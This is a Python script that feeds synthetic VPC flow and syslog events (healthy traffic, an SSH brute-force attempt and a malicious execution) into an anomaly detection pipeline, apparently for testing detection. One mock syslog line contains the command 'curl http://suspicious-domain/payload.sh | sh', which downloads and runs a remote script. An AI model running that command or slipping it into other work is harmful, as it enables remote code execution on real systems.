from __future__ import annotations

import json
import logging
from dataclasses import dataclass
from typing import Sequence

from src.pipeline import AnomalyDetectionPipeline, PipelineConfig

logger = logging.getLogger(__name__)


@dataclass(slots=True)
class MockWorkloadEvent:
    """Synthetic workload event with network and system log entries."""

    name: str
    vpc_flow_line: str
    syslog_line: str


def build_mock_stream() -> list[MockWorkloadEvent]:
    return [
        MockWorkloadEvent(
            name="healthy-traffic",
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 10.0.1.10 10.0.2.8 51512 443 6 12 824 "
                "1700000000 1700000060 ACCEPT OK"
            ),
            syslog_line=(
                "host=i-01 app=nginx severity=info msg='service healthy' "
                "user=svc-analytics login=success"
            ),
        ),
        MockWorkloadEvent(
            name="brute-force-attempt",
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 185.23.44.91 10.0.5.19 48211 22 6 398 412900 "
                "1700000100 1700000160 REJECT OK"
            ),
            syslog_line=(
                "host=i-93 service=sshd severity=warning msg='Failed password for admin from 185.23.44.91' "
                "user=admin ip=185.23.44.91 "
                "attempts=398/60s"
            ),
        ),
        MockWorkloadEvent(
            name="malicious-execution",
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 10.0.8.3 10.0.5.19 33112 443 6 255 918332 "
                "1700000200 1700000260 ACCEPT OK"
            ),
            syslog_line=(
                "host=i-0f991 service=auth severity=error user=ec2-user "
                "proc=curl cmd='curl http://suspicious-domain/payload.sh | sh'"
            ),
        ),
    ]


def run_pipeline(events: Sequence[MockWorkloadEvent], config: PipelineConfig) -> None:
    pipeline = AnomalyDetectionPipeline(config=config)

    for event_id, event in enumerate(events, start=1):
        try:
            result = pipeline.process_event(
                event_name=event.name,
                vpc_flow_line=event.vpc_flow_line,
                system_log_line=event.syslog_line,
            )
            payload = {"event_id": event_id, **result}
            print(json.dumps(payload, indent=2))
        except ValueError:
            logger.warning("Skipping event %s due to parser failure.", event.name)


def main() -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    config = PipelineConfig(threshold=0.65)
    run_pipeline(events=build_mock_stream(), config=config)


if __name__ == "__main__":
    main()
